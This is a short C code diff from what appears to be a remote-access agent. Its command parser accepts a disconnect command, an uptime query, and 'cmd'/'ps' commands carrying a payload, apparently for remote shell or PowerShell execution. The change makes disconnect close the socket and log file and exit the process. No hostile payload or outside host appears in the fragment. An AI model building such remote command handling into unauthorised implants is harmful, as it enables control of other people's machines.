@@ -612,7 +612,14 @@ void parse_action(const char* action) {
         get_uptime();
     } else if (strcmp(command, "di") == 0) {
         exit_process = TRUE;
-        send_command("{\"response\": {\"data\": \"Disconnecting...\"}}");
+        if (client_socket != INVALID_SOCKET) {
+            closesocket(client_socket);
+        }
+        if (log_file) {
+            fclose(log_file);
+        }
+        WSACleanup();
+        exit(0);
     } else if (strcmp(command, "cmd") == 0 || strcmp(command, "ps") == 0) {
         char* payload = strtok(NULL, "");
         if (payload) {
